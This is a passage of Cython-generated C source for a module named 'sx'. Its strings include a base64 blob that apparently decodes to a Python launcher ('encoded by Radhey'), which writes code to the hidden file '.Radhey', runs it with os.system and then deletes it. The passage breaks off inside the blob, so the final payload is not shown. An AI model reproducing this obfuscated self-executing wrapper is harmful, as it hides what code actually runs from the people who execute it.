= NULL;\\\n    (var) = (likely(__pyx_dict_version == __PYX_GET_DICT_VERSION(__pyx_mstate_global->__pyx_d))) ?\\\n        (likely(__pyx_dict_cached_value) ? __Pyx_NewRef(__pyx_dict_cached_value) : __Pyx_GetBuiltinName(name)) :\\\n        __Pyx__GetModuleGlobalName(name, &__pyx_dict_version, &__pyx_dict_cached_value);\\\n} while(0)\n#define __Pyx_GetModuleGlobalNameUncached(var, name)  do {\\\n    PY_UINT64_T __pyx_dict_version;\\\n    PyObject *__pyx_dict_cached_value;\\\n    (var) = __Pyx__GetModuleGlobalName(name, &__pyx_dict_version, &__pyx_dict_cached_value);\\\n} while(0)\nstatic PyObject *__Pyx__GetModuleGlobalName(PyObject *name, PY_UINT64_T *dict_version, PyObject **dict_cached_value);\n#else\n#define __Pyx_GetModuleGlobalName(var, name)  (var) = __Pyx__GetModuleGlobalName(name)\n#define __Pyx_GetModuleGlobalNameUncached(var, name)  (var) = __Pyx__GetModuleGlobalName(name)\nstatic CYTHON_INLINE PyObject *__Pyx__GetModuleGlobalName(PyObject *name);\n#endif\n\n\n#if CYTHON_FAST_PYCALL\n#if !CYTHON_VECTORCALL\n#define __Pyx_PyFunction_FastCall(func, args, nargs)\\\n    __Pyx_PyFunction_FastCallDict((func), (args), (nargs), NULL)\nstatic PyObject *__Pyx_PyFunction_FastCallDict(PyObject *func, PyObject *const *args, Py_ssize_t nargs, PyObject *kwargs);\n#endif\n#define __Pyx_BUILD_ASSERT_EXPR(cond)\\\n    (sizeof(char [1 - 2*!(cond)]) - 1)\n#ifndef Py_MEMBER_SIZE\n#define Py_MEMBER_SIZE(type, member) sizeof(((type *)0)->member)\n#endif\n#if !CYTHON_VECTORCALL\n#if PY_VERSION_HEX >= 0x03080000\n  #include "frameobject.h"\n  #define __Pxy_PyFrame_Initialize_Offsets()\n  #define __Pyx_PyFrame_GetLocalsplus(frame)  ((frame)->f_localsplus)\n#else\n  static size_t __pyx_pyframe_localsplus_offset = 0;\n  #include "frameobject.h"\n  #define __Pxy_PyFrame_Initialize_Offsets()\\\n    ((void)__Pyx_BUILD_ASSERT_EXPR(sizeof(PyFrameObject) == offsetof(PyFrameObject, f_localsplus) + Py_MEMBER_SIZE(PyFrameObject, f_localsplus)),\\\n     (void)(__pyx_pyframe_localsplus_offset = ((size_t)PyFrame_Type.tp_basicsize) - Py_MEMBER_SIZE(PyFrameObject, f_localsplus)))\n  #define __Pyx_PyFrame_GetLocalsplus(frame)\\\n    (assert(__pyx_pyframe_localsplus_offset), (PyObject **)(((char *)(frame)) + __pyx_pyframe_localsplus_offset))\n#endif\n#endif\n#endif\n\n\n#if CYTHON_COMPILING_IN_CPYTHON\nstatic CYTHON_INLINE PyObject* __Pyx_PyObject_Call(PyObject *func, PyObject *arg, PyObject *kw);\n#else\n#define __Pyx_PyObject_Call(func, arg, kw) PyObject_Call(func, arg, kw)\n#endif\n\n\n#if CYTHON_COMPILING_IN_CPYTHON\nstatic CYTHON_INLINE PyObject* __Pyx_PyObject_CallMethO(PyObject *func, PyObject *arg);\n#endif\n\n\n#define __Pyx_PyObject_FastCall(func, args, nargs)  __Pyx_PyObject_FastCallDict(func, args, (size_t)(nargs), NULL)\nstatic CYTHON_INLINE PyObject* __Pyx_PyObject_FastCallDict(PyObject *func, PyObject * const*args, size_t nargs, PyObject *kwargs);\n\n\n#if CYTHON_USE_PYTYPE_LOOKUP && CYTHON_USE_TYPE_SLOTS\n#define __Pyx_PyObject_LookupSpecialNoError(obj, attr_name)  __Pyx__PyObject_LookupSpecial(obj, attr_name, 0)\n#define __Pyx_PyObject_LookupSpecial(obj, attr_name)  __Pyx__PyObject_LookupSpecial(obj, attr_name, 1)\nstatic CYTHON_INLINE PyObject* __Pyx__PyObject_LookupSpecial(PyObject* obj, PyObject* attr_name, int with_error);\n#else\n#define __Pyx_PyObject_LookupSpecialNoError(o,n) __Pyx_PyObject_GetAttrStrNoError(o,n)\n#define __Pyx_PyObject_LookupSpecial(o,n) __Pyx_PyObject_GetAttrStr(o,n)\n#endif\n\n\n#if CYTHON_USE_EXC_INFO_STACK && CYTHON_FAST_THREAD_STATE\nstatic _PyErr_StackItem * __Pyx_PyErr_GetTopmostException(PyThreadState *tstate);\n#endif\n\n\n#if CYTHON_FAST_THREAD_STATE\n#define __Pyx_ExceptionSave(type, value, tb)  __Pyx__ExceptionSave(__pyx_tstate, type, value, tb)\nstatic CYTHON_INLINE void __Pyx__ExceptionSave(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb);\n#define __Pyx_ExceptionReset(type, value, tb)  __Pyx__ExceptionReset(__pyx_tstate, type, value, tb)\nstatic CYTHON_INLINE void __Pyx__ExceptionReset(PyThreadState *tstate, PyObject *type, PyObject *value, PyObject *tb);\n#else\n#define __Pyx_ExceptionSave(type, value, tb)   PyErr_GetExcInfo(type, value, tb)\n#define __Pyx_ExceptionReset(type, value, tb)  PyErr_SetExcInfo(type, value, tb)\n#endif\n\n\n#if CYTHON_FAST_THREAD_STATE\n#define __Pyx_GetException(type, value, tb)  __Pyx__GetException(__pyx_tstate, type, value, tb)\nstatic int __Pyx__GetException(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb);\n#else\nstatic int __Pyx_GetException(PyObject **type, PyObject **value, PyObject **tb);\n#endif\n\n\n#if CYTHON_COMPILING_IN_LIMITED_API && __PYX_LIMITED_VERSION_HEX < 0x030d0000\n#define __Pyx_PyObject_DelAttr(o, n) PyObject_SetAttr(o, n, NULL)\n#else\n#define __Pyx_PyObject_DelAttr(o, n) PyObject_DelAttr(o, n)\n#endif\n\n\n#if CYTHON_USE_TYPE_SLOTS\n#define __Pyx_PyObject_DelAttrStr(o,n) __Pyx_PyObject_SetAttrStr(o, n, NULL)\nstatic CYTHON_INLINE int __Pyx_PyObject_SetAttrStr(PyObject* obj, PyObject* attr_name, PyObject* value);\n#else\n#define __Pyx_PyObject_DelAttrStr(o,n)   __Pyx_PyObject_DelAttr(o,n)\n#define __Pyx_PyObject_SetAttrStr(o,n,v) PyObject_SetAttr(o,n,v)\n#endif\n\n\n#if CYTHON_FAST_THREAD_STATE\n#define __Pyx_ExceptionSwap(type, value, tb)  __Pyx__ExceptionSwap(__pyx_tstate, type, value, tb)\nstatic CYTHON_INLINE void __Pyx__ExceptionSwap(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb);\n#else\nstatic CYTHON_INLINE void __Pyx_ExceptionSwap(PyObject **type, PyObject **value, PyObject **tb);\n#endif\n\n\n#if CYTHON_VECTORCALL && PY_VERSION_HEX >= 0x03090000\n#define __Pyx_PyObject_FastCallMethod(name, args, nargsf) PyObject_VectorcallMethod(name, args, nargsf, NULL)\n#else\nstatic PyObject *__Pyx_PyObject_FastCallMethod(PyObject *name, PyObject *const *args, size_t nargsf);\n#endif\n\n\n#if CYTHON_CLINE_IN_TRACEBACK && CYTHON_CLINE_IN_TRACEBACK_RUNTIME\nstatic int __Pyx_CLineForTraceback(PyThreadState *tstate, int c_line);\n#else\n#define __Pyx_CLineForTraceback(tstate, c_line)  (((CYTHON_CLINE_IN_TRACEBACK)) ? c_line : 0)\n#endif\n\n\n#if CYTHON_COMPILING_IN_LIMITED_API\ntypedef PyObject __Pyx_CachedCodeObjectType;\n#else\ntypedef PyCodeObject __Pyx_CachedCodeObjectType;\n#endif\ntypedef struct {\n    __Pyx_CachedCodeObjectType* code_object;\n    int code_line;\n} __Pyx_CodeObjectCacheEntry;\nstruct __Pyx_CodeObjectCache {\n    int count;\n    int max_count;\n    __Pyx_CodeObjectCacheEntry* entries;\n  #if CYTHON_COMPILING_IN_CPYTHON_FREETHREADING\n    __pyx_atomic_int_type accessor_count;\n  #endif\n};\nstatic int __pyx_bisect_code_objects(__Pyx_CodeObjectCacheEntry* entries, int count, int code_line);\nstatic __Pyx_CachedCodeObjectType *__pyx_find_code_object(int code_line);\nstatic void __pyx_insert_code_object(int code_line, __Pyx_CachedCodeObjectType* code_object);\n\n\nstatic void __Pyx_AddTraceback(const char *funcname, int c_line,\n                               int py_line, const char *filename);\n\n\n#if CYTHON_COMPILING_IN_LIMITED_API\ntypedef PyObject *__Pyx_TypeName;\n#define __Pyx_FMT_TYPENAME "%U"\n#define __Pyx_DECREF_TypeName(obj) Py_XDECREF(obj)\n#if __PYX_LIMITED_VERSION_HEX >= 0x030d0000\n#define __Pyx_PyType_GetFullyQualifiedName PyType_GetFullyQualifiedName\n#else\nstatic __Pyx_TypeName __Pyx_PyType_GetFullyQualifiedName(PyTypeObject* tp);\n#endif\n#else  // !LIMITED_API\ntypedef const char *__Pyx_TypeName;\n#define __Pyx_FMT_TYPENAME "%.200s"\n#define __Pyx_PyType_GetFullyQualifiedName(tp) ((tp)->tp_name)\n#define __Pyx_DECREF_TypeName(obj)\n#endif\n\n\n#if !defined(__INTEL_COMPILER) && defined(__GNUC__) && (__GNUC__ > 4 || (__GNUC__ == 4 && __GNUC_MINOR__ >= 6))\n#define __Pyx_HAS_GCC_DIAGNOSTIC\n#endif\n\n\nCYTHON_UNUSED static int __Pyx_VectorcallBuilder_AddArg_Check(PyObject *key, PyObject *value, PyObject *builder, PyObject **args, int n);\n#if CYTHON_VECTORCALL\n#if PY_VERSION_HEX >= 0x03090000\n#define __Pyx_Object_Vectorcall_CallFromBuilder PyObject_Vectorcall\n#else\n#define __Pyx_Object_Vectorcall_CallFromBuilder _PyObject_Vectorcall\n#endif\n#define __Pyx_MakeVectorcallBuilderKwds(n) PyTuple_New(n)\nstatic int __Pyx_VectorcallBuilder_AddArg(PyObject *key, PyObject *value, PyObject *builder, PyObject **args, int n);\nstatic int __Pyx_VectorcallBuilder_AddArgStr(const char *key, PyObject *value, PyObject *builder, PyObject **args, int n);\n#else\n#define __Pyx_Object_Vectorcall_CallFromBuilder __Pyx_PyObject_FastCallDict\n#define __Pyx_MakeVectorcallBuilderKwds(n) __Pyx_PyDict_NewPresized(n)\n#define __Pyx_VectorcallBuilder_AddArg(key, value, builder, args, n) PyDict_SetItem(builder, key, value)\n#define __Pyx_VectorcallBuilder_AddArgStr(key, value, builder, args, n) PyDict_SetItemString(builder, key, value)\n#endif\n\n\nstatic CYTHON_INLINE PyObject* __Pyx_PyLong_From_long(long value);\n\n\nstatic CYTHON_INLINE long __Pyx_PyLong_As_long(PyObject *);\n\n\nstatic CYTHON_INLINE int __Pyx_PyLong_As_int(PyObject *);\n\n\n#if CYTHON_COMPILING_IN_CPYTHON\n#define __Pyx_TypeCheck(obj, type) __Pyx_IsSubtype(Py_TYPE(obj), (PyTypeObject *)type)\n#define __Pyx_TypeCheck2(obj, type1, type2) __Pyx_IsAnySubtype2(Py_TYPE(obj), (PyTypeObject *)type1, (PyTypeObject *)type2)\nstatic CYTHON_INLINE int __Pyx_IsSubtype(PyTypeObject *a, PyTypeObject *b);\nstatic CYTHON_INLINE int __Pyx_IsAnySubtype2(PyTypeObject *cls, PyTypeObject *a, PyTypeObject *b);\nstatic CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches(PyObject *err, PyObject *type);\nstatic CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches2(PyObject *err, PyObject *type1, PyObject *type2);\n#else\n#define __Pyx_TypeCheck(obj, type) PyObject_TypeCheck(obj, (PyTypeObject *)type)\n#define __Pyx_TypeCheck2(obj, type1, type2) (PyObject_TypeCheck(obj, (PyTypeObject *)type1) || PyObject_TypeCheck(obj, (PyTypeObject *)type2))\n#define __Pyx_PyErr_GivenExceptionMatches(err, type) PyErr_GivenExceptionMatches(err, type)\nstatic CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches2(PyObject *err, PyObject *type1, PyObject *type2) {\n    return PyErr_GivenExceptionMatches(err, type1) || PyErr_GivenExceptionMatches(err, type2);\n}\n#endif\n#define __Pyx_PyErr_ExceptionMatches2(err1, err2)  __Pyx_PyErr_GivenExceptionMatches2(__Pyx_PyErr_CurrentExceptionType(), err1, err2)\n#define __Pyx_PyException_Check(obj) __Pyx_TypeCheck(obj, PyExc_Exception)\n#ifdef PyExceptionInstance_Check\n  #define __Pyx_PyBaseException_Check(obj) PyExceptionInstance_Check(obj)\n#else\n  #define __Pyx_PyBaseException_Check(obj) __Pyx_TypeCheck(obj, PyExc_BaseException)\n#endif\n\n\nstatic unsigned long __Pyx_get_runtime_version(void);\n\n\nstatic int __Pyx_check_binary_version(unsigned long ct_version, unsigned long rt_version, int allow_newer);\n\n\n#if CYTHON_PEP489_MULTI_PHASE_INIT && CYTHON_USE_MODULE_STATE\nstatic PyObject *__Pyx_State_FindModule(void*);\nstatic int __Pyx_State_AddModule(PyObject* module, void*);\nstatic int __Pyx_State_RemoveModule(void*);\n#elif CYTHON_USE_MODULE_STATE\n#define __Pyx_State_FindModule PyState_FindModule\n#define __Pyx_State_AddModule PyState_AddModule\n#define __Pyx_State_RemoveModule PyState_RemoveModule\n#endif\n\n\n\n#if CYTHON_COMPILING_IN_LIMITED_API\n    #if CYTHON_METH_FASTCALL\n        #define __PYX_FASTCALL_ABI_SUFFIX  "_fastcall"\n    #else\n        #define __PYX_FASTCALL_ABI_SUFFIX\n    #endif\n    #define __PYX_LIMITED_ABI_SUFFIX "limited" __PYX_FASTCALL_ABI_SUFFIX __PYX_AM_SEND_ABI_SUFFIX\n#else\n    #define __PYX_LIMITED_ABI_SUFFIX\n#endif\n#if __PYX_HAS_PY_AM_SEND == 1\n    #define __PYX_AM_SEND_ABI_SUFFIX\n#elif __PYX_HAS_PY_AM_SEND == 2\n    #define __PYX_AM_SEND_ABI_SUFFIX "amsendbackport"\n#else\n    #define __PYX_AM_SEND_ABI_SUFFIX "noamsend"\n#endif\n#ifndef __PYX_MONITORING_ABI_SUFFIX\n    #define __PYX_MONITORING_ABI_SUFFIX\n#endif\n#if CYTHON_USE_TP_FINALIZE\n    #define __PYX_TP_FINALIZE_ABI_SUFFIX\n#else\n    #define __PYX_TP_FINALIZE_ABI_SUFFIX "nofinalize"\n#endif\n#if CYTHON_USE_FREELISTS || !defined(__Pyx_AsyncGen_USED)\n    #define __PYX_FREELISTS_ABI_SUFFIX\n#else\n    #define __PYX_FREELISTS_ABI_SUFFIX "nofreelists"\n#endif\n#define CYTHON_ABI  __PYX_ABI_VERSION __PYX_LIMITED_ABI_SUFFIX __PYX_MONITORING_ABI_SUFFIX __PYX_TP_FINALIZE_ABI_SUFFIX __PYX_FREELISTS_ABI_SUFFIX __PYX_AM_SEND_ABI_SUFFIX\n#define __PYX_ABI_MODULE_NAME "_cython_" CYTHON_ABI\n#define __PYX_TYPE_MODULE_PREFIX __PYX_ABI_MODULE_NAME "."\n\n\n\n\n\n#define __Pyx_MODULE_NAME "sx"\nextern int __pyx_module_is_main_sx;\nint __pyx_module_is_main_sx = 0;\n\n\n\nstatic PyObject *__pyx_builtin_open;\nstatic PyObject *__pyx_builtin_print;\n\nstatic const char __pyx_k_[] = "?";\nstatic const char __pyx_k_D[] = "D";\nstatic const char __pyx_k_E[] = "E";\nstatic const char __pyx_k_os[] = "os";\nstatic const char __pyx_k_wb[] = "wb";\nstatic const char __pyx_k_exit[] = "__exit__";\nstatic const char __pyx_k_main[] = "__main__";\nstatic const char __pyx_k_name[] = "__name__";\nstatic const char __pyx_k_open[] = "open";\nstatic const char __pyx_k_path[] = "path";\nstatic const char __pyx_k_spec[] = "__spec__";\nstatic const char __pyx_k_test[] = "__test__";\nstatic const char __pyx_k_clear[] = "clear";\nstatic const char __pyx_k_enter[] = "__enter__";\nstatic const char __pyx_k_print[] = "print";\nstatic const char __pyx_k_write[] = "write";\nstatic const char __pyx_k_Radhey[] = ".Radhey";\nstatic const char __pyx_k_base64[] = "base64";\nstatic const char __pyx_k_exists[] = "exists";\nstatic const char __pyx_k_module[] = "__module__";\nstatic const char __pyx_k_remove[] = "remove";\nstatic const char __pyx_k_system[] = "system";\nstatic const char __pyx_k_qualname[] = "__qualname__";\nstatic const char __pyx_k_b64decode[] = "b64decode";\nstatic const char __pyx_k_sunradhey[] = "sunradhey";\nstatic const char __pyx_k_initializing[] = "_initializing";\nstatic const char __pyx_k_python3_Radhey[] = "python3 .Radhey";\nstatic const char __pyx_k_cline_in_traceback[] = "cline_in_traceback";\nstatic const char __pyx_k_aW1wb3J0IG9zCmltcG9ydCB0aW1lCmlt[] = "aW1wb3J0IG9zCmltcG9ydCB0aW1lCmltcG9ydCBzeXMKcHJpbnQoIlx4MWJbMTs5Mm1ceDFiWzM4OzU7NDZtTE9BRElOR+KAouKAouKAoiIpCnByaW50KCcnKQpwcmludCgiXHgxYlsxOzkybVx4MWJbMzg7NTs1MG0jIyMjVEhJUyBJUyBFTkNPREVEIEJZICNSQURIRVkg4oCiIEBCb2xvUmFkaGV5IikKcHJpbnQoJycpClBSRUZJWD1zeXMucHJlZml4CkVYRUNVVEVfRklMRSA9ICIuYm9sb3JhZGhleS9nYSIKRVhQT1JUX1BZVEhPTkhPTUUgPSJleHBvcnQgUFlUSE9OSE9NRT0iK3N5cy5wcmVmaXgKRVhQT1JUX1BZVEhPTl9FWEVDVVRBQkxFID0iZXhwb3J0IFBZVEhPTl9FWEVDVVRBQkxFPSIrIHN5cy5leGVjdXRhYmxlClJVTiA9ICIuLyIrIEVYRUNVVEVfRklMRQppZiBvcy5wYXRoLmlzZmlsZShFWEVDVVRFX0ZJTEUpOgogICAgb3Muc3lzdGVtKEVYUE9SVF9QWVRIT05IT01FICsiJiYiKyBFWFBPUlRfUFlUSE9OX0VYRUNVVEFCTEUgKyImJiIrIFJVTikKICAgIGV4aXQoMCkKQ19TT1VSQ0UgPSByIiIiCgojaWZuZGVmIFBZX1NTSVpFX1RfQ0xFQU4KI2RlZmluZSBQWV9TU0laRV9UX0NMRUFOCiNlbmRpZiAKCiNpZiBkZWZpbmVkKFB5X0xJTUlURURfQVBJKSAmJiAhZGVmaW5lZChDWVRIT05fTElNSVRFRF9BUEkpCiAgI2RlZmluZSBDWVRIT05fTElNSVRFRF9BUEkgMQojZW5kaWYKCiNpbmNsdWRlICJQeXRob24uaCIKI2lmbmRlZiBQeV9QWVRIT05fSAogICAgI2Vycm9yIFB5dGhvbiBoZWFkZXJzIG5lZWRlZCB0byBjb21waWxlIEMgZXh0ZW5zaW9ucywgcGxlYXNlIGluc3RhbGwgZGV2ZWxvcG1lbnQgdmVyc2lvbiBvZiBQeXRob24uCiNlbGlmIFBZX1ZFUlNJT05fSEVYIDwgMHgwMzA4MDAwMAogICAgI2Vycm9yIEN5dGhvbiByZXF1aXJlcyBQeXRob24gMy44Ky4KI2Vsc2UKI2RlZmluZSBfX1BZWF9BQklfVkVSU0lPTiAiM18xXzIiCiNkZWZpbmUgQ1lUSE9OX0hFWF9WRVJTSU9OIDB4MDMwMTAyRjAKI2RlZmluZSBDWVRIT05fRlVUVVJFX0RJVklTSU9OIDEKCiNpbmNsdWRlIDxzdGRkZWYuaD4KI2lmbmRlZiBvZmZzZXRvZgogICNkZWZpbmUgb2Zmc2V0b2YodHlwZSwgbWVtYmVyKSAoIChzaXplX3QpICYgKCh0eXBlKikwKSAtPiBtZW1iZXIgKQojZW5kaWYKI2lmICFkZWZpbmVkKF9XSU4zMikgJiYgIWRlZmluZWQoV0lOMzIpICYmICFkZWZpbmVkKE1TX1dJTkRPV1MpCiAgI2lmbmRlZiBfX3N0ZGNhbGwKICAgICNkZWZpbmUgX19zdGRjYWxsCiAgI2VuZGlmCiAgI2lmbmRlZiBfX2NkZWNsCiAgICAjZGVmaW5lIF9fY2RlY2wKICAjZW5kaWYKICAjaWZuZGVmIF9fZmFzdGNhbGwKICAgICNkZWZpbmUgX19mYXN0Y2FsbAogICNlbmRpZgojZW5kaWYKI2lmbmRlZiBETF9JTVBPUlQKICAjZGVmaW5lIERMX0lNUE9SVCh0KSB0CiNlbmRpZgojaWZuZGVmIERMX0VYUE9SVAogICNkZWZpbmUgRExfRVhQT1JUKHQpIHQKI2VuZGlmCiNkZWZpbmUgX19QWVhfQ09NTUEgLAojaWZuZGVmIEhBVkVfTE9OR19MT05HCiAgI2RlZmluZSBIQVZFX0xP""TkdfTE9ORwojZW5kaWYKI2lmbmRlZiBQWV9MT05HX0xPTkcKICAjZGVmaW5lIFBZX0xPTkdfTE9ORyBMT05HX0xPTkcKI2VuZGlmCiNpZm5kZWYgUHlfSFVHRV9WQUwKICAjZGVmaW5lIFB5X0hVR0VfVkFMIEhVR0VfVkFMCiNlbmRpZgojZGVmaW5lIF9fUFlYX0xJTUlURURfVkVSU0lPTl9IRVggUFlfVkVSU0lPTl9IRVgKI2lmIGRlZmluZWQoR1JBQUxWTV9QWVRIT04pCiAgCiAgI2RlZmluZSBDWVRIT05fQ09NUElMSU5HX0lOX1BZUFkgMAogICNkZWZpbmUgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OIDAKICAjZGVmaW5lIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkgMAogICNkZWZpbmUgQ1lUSE9OX0NPTVBJTElOR19JTl9HUkFBTCAxCiAgI2RlZmluZSBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT05fRlJFRVRIUkVBRElORyAwCiAgI3VuZGVmIENZVEhPTl9VU0VfVFlQRV9TTE9UUwogICNkZWZpbmUgQ1lUSE9OX1VTRV9UWVBFX1NMT1RTIDAKICAjdW5kZWYgQ1lUSE9OX1VTRV9UWVBFX1NQRUNTCiAgI2RlZmluZSBDWVRIT05fVVNFX1RZUEVfU1BFQ1MgMAogICN1bmRlZiBDWVRIT05fVVNFX1BZVFlQRV9MT09LVVAKICAjZGVmaW5lIENZVEhPTl9VU0VfUFlUWVBFX0xPT0tVUCAwCiAgI3VuZGVmIENZVEhPTl9VU0VfUFlMSVNUX0lOVEVSTkFMUwogICNkZWZpbmUgQ1lUSE9OX1VTRV9QWUxJU1RfSU5URVJOQUxTIDAKICAjdW5kZWYgQ1lUSE9OX1VTRV9VTklDT0RFX0lOVEVSTkFMUwogICNkZWZpbmUgQ1lUSE9OX1VTRV9VTklDT0RFX0lOVEVSTkFMUyAwCiAgI3VuZGVmIENZVEhPTl9VU0VfVU5JQ09ERV9XUklURVIKICAjZGVmaW5lIENZVEhPTl9VU0VfVU5JQ09ERV9XUklURVIgMAogICN1bmRlZiBDWVRIT05fVVNFX1BZTE9OR19JTlRFUk5BTFMKICAjZGVmaW5lIENZVEhPTl9VU0VfUFlMT05HX0lOVEVSTkFMUyAwCiAgI3VuZGVmIENZVEhPTl9BVk9JRF9CT1JST1dFRF9SRUZTCiAgI2RlZmluZSBDWVRIT05fQVZPSURfQk9SUk9XRURfUkVGUyAxCiAgI3VuZGVmIENZVEhPTl9BVk9JRF9USFJFQURfVU5TQUZFX0JPUlJPV0VEX1JFRlMKICAjZGVmaW5lIENZVEhPTl9BVk9JRF9USFJFQURfVU5TQUZFX0JPUlJPV0VEX1JFRlMgMQogICN1bmRlZiBDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TCiAgI2RlZmluZSBDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TIDAKICAjdW5kZWYgQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkUKICAjZGVmaW5lIENZVEhPTl9BU1NVTUVfU0FGRV9TSVpFIDAKICAjdW5kZWYgQ1lUSE9OX1VOUEFDS19NRVRIT0RTCiAgI2RlZmluZSBDWVRIT05fVU5QQUNLX01FVEhPRFMgMAogICN1bmRlZiBDWVRIT05fRkFTVF9USFJFQURfU1RBVEUKICAjZGVmaW5lIENZVEhPTl9GQVNUX1RIUkVBRF9TVEFURSAwCiAgI3VuZGVmIENZVEhPTl9GQVNUX0dJTAogICNkZWZpbmUgQ1lUSE9OX0ZBU1RfR0lMIDAKICAjdW5kZWYgQ1lUSE9OX01FVEhfRkFTVENBTEwKICAjZGVmaW5lIENZVEhPTl9NRVRIX0ZBU1RD""QUxMIDAKICAjdW5kZWYgQ1lUSE9OX0ZBU1RfUFlDQUxMCiAgI2RlZmluZSBDWVRIT05fRkFTVF9QWUNBTEwgMAogICNpZm5kZWYgQ1lUSE9OX1BFUDQ4N19JTklUX1NVQkNMQVNTCiAgICAjZGVmaW5lIENZVEhPTl9QRVA0ODdfSU5JVF9TVUJDTEFTUyAxCiAgI2VuZGlmCiAgI3VuZGVmIENZVEhPTl9QRVA0ODlfTVVMVElfUEhBU0VfSU5JVAogICNkZWZpbmUgQ1lUSE9OX1BFUDQ4OV9NVUxUSV9QSEFTRV9JTklUIDEKICAjdW5kZWYgQ1lUSE9OX1VTRV9NT0RVTEVfU1RBVEUKICAjZGVmaW5lIENZVEhPTl9VU0VfTU9EVUxFX1NUQVRFIDAKICAjdW5kZWYgQ1lUSE9OX1VTRV9TWVNfTU9OSVRPUklORwogICNkZWZpbmUgQ1lUSE9OX1VTRV9TWVNfTU9OSVRPUklORyAwCiAgI3VuZGVmIENZVEhPTl9VU0VfVFBfRklOQUxJWkUKICAjZGVmaW5lIENZVEhPTl9VU0VfVFBfRklOQUxJWkUgMAogICN1bmRlZiBDWVRIT05fVVNFX0FNX1NFTkQKICAjZGVmaW5lIENZVEhPTl9VU0VfQU1fU0VORCAwCiAgI3VuZGVmIENZVEhPTl9VU0VfRElDVF9WRVJTSU9OUwogICNkZWZpbmUgQ1lUSE9OX1VTRV9ESUNUX1ZFUlNJT05TIDAKICAjdW5kZWYgQ1lUSE9OX1VTRV9FWENfSU5GT19TVEFDSwogICNkZWZpbmUgQ1lUSE9OX1VTRV9FWENfSU5GT19TVEFDSyAxCiAgI2lmbmRlZiBDWVRIT05fVVBEQVRFX0RFU0NSSVBUT1JfRE9DCiAgICAjZGVmaW5lIENZVEhPTl9VUERBVEVfREVTQ1JJUFRPUl9ET0MgMAogICNlbmRpZgogICN1bmRlZiBDWVRIT05fVVNFX0ZSRUVMSVNUUwogICNkZWZpbmUgQ1lUSE9OX1VTRV9GUkVFTElTVFMgMAojZWxpZiBkZWZpbmVkKFBZUFlfVkVSU0lPTikKICAjZGVmaW5lIENZVEhPTl9DT01QSUxJTkdfSU5fUFlQWSAxCiAgI2RlZmluZSBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT04gMAogICNkZWZpbmUgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSAwCiAgI2RlZmluZSBDWVRIT05fQ09NUElMSU5HX0lOX0dSQUFMIDAKICAjZGVmaW5lIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTl9GUkVFVEhSRUFESU5HIDAKICAjdW5kZWYgQ1lUSE9OX1VTRV9UWVBFX1NMT1RTCiAgI2RlZmluZSBDWVRIT05fVVNFX1RZUEVfU0xPVFMgMQogICNpZm5kZWYgQ1lUSE9OX1VTRV9UWVBFX1NQRUNTCiAgICAjZGVmaW5lIENZVEhPTl9VU0VfVFlQRV9TUEVDUyAwCiAgI2VuZGlmCiAgI3VuZGVmIENZVEhPTl9VU0VfUFlUWVBFX0xPT0tVUAogICNkZWZpbmUgQ1lUSE9OX1VTRV9QWVRZUEVfTE9PS1VQIDAKICAjdW5kZWYgQ1lUSE9OX1VTRV9QWUxJU1RfSU5URVJOQUxTCiAgI2RlZmluZSBDWVRIT05fVVNFX1BZTElTVF9JTlRFUk5BTFMgMAogICN1bmRlZiBDWVRIT05fVVNFX1VOSUNPREVfSU5URVJOQUxTCiAgI2RlZmluZSBDWVRIT05fVVNFX1VOSUNPREVfSU5URVJOQUxTIDAKICAjdW5kZWYgQ1lUSE9OX1VTRV9VTklDT0RFX1dSSVRFUgogICNkZWZpbmUgQ1lUSE9OX1VTRV9VTklDT0RFX1dSSVRFUiAwCiAgI3VuZGVmIENZVEhP""Tl9VU0VfUFlMT05HX0lOVEVSTkFMUwogICNkZWZpbmUgQ1lUSE9OX1VTRV9QWUxPTkdfSU5URVJOQUxTIDAKICAjdW5kZWYgQ1lUSE9OX0FWT0lEX0JPUlJPV0VEX1JFRlMKICAjZGVmaW5lIENZVEhPTl9BVk9JRF9CT1JST1dFRF9SRUZTIDEKICAjdW5kZWYgQ1lUSE9OX0FWT0lEX1RIUkVBRF9VTlNBRkVfQk9SUk9XRURfUkVGUwogICNkZWZpbmUgQ1lUSE9OX0FWT0lEX1RIUkVBRF9VTlNBRkVfQk9SUk9XRURfUkVGUyAxCiAgI3VuZGVmIENZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MKICAjZGVmaW5lIENZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MgMAogICNpZm5kZWYgQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkUKICAgICNkZWZpbmUgQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkUgMQogICNlbmRpZgogICN1bmRlZiBDWVRIT05fVU5QQUNLX01FVEhPRFMKICAjZGVmaW5lIENZVEhPTl9VTlBBQ0tfTUVUSE9EUyAwCiAgI3VuZGVmIENZVEhPTl9GQVNUX1RIUkVBRF9TVEFURQogICNkZWZpbmUgQ1lUSE9OX0ZBU1RfVEhSRUFEX1NUQVRFIDAKICAjdW5kZWYgQ1lUSE9OX0ZBU1RfR0lMCiAgI2RlZmluZSBDWVRIT05fRkFTVF9HSUwgMAogICN1bmRlZiBDWVRIT05fTUVUSF9GQVNUQ0FMTAogICNkZWZpbmUgQ1lUSE9OX01FVEhfRkFTVENBTEwgMAogICN1bmRlZiBDWVRIT05fRkFTVF9QWUNBTEwKICAjZGVmaW5lIENZVEhPTl9GQVNUX1BZQ0FMTCAwCiAgI2lmbmRlZiBDWVRIT05fUEVQNDg3X0lOSVRfU1VCQ0xBU1MKICAgICNkZWZpbmUgQ1lUSE9OX1BFUDQ4N19JTklUX1NVQkNMQVNTIDEKICAjZW5kaWYKICAjaWYgUFlfVkVSU0lPTl9IRVgg